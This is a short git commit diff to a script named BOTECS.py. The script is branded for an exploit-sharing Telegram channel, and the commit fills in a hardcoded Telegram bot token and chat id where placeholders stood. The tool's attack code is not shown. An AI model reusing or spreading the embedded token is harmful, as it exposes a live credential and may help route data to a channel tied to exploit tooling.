9591577da83bd9dc601fcde65d35009f5f33f2ac
huynhquangdev <141423816+Quangqq@users.noreply.github.com>
2024-06-19 00:39:29 +0700

    Update BOTECS.py

--- BOTECS.py
+++ BOTECS.py
@@ -4,8 +4,8 @@
 # Broadcasting channel Telegram : @Team_Exploit
 # Tool Vip BotECS In channel : @KnightGuardian59
 
-token = ' Insert your bot token  '
-chat_id = 'Insert your account chat id ' 
+token = '6769722085:AAHbaRgRxnUPoZpXkUMkswBkvSV5Adoc2Fg'
+chat_id = '-1002136414572' 
 
 from os import system
 from platform import (system,platform)
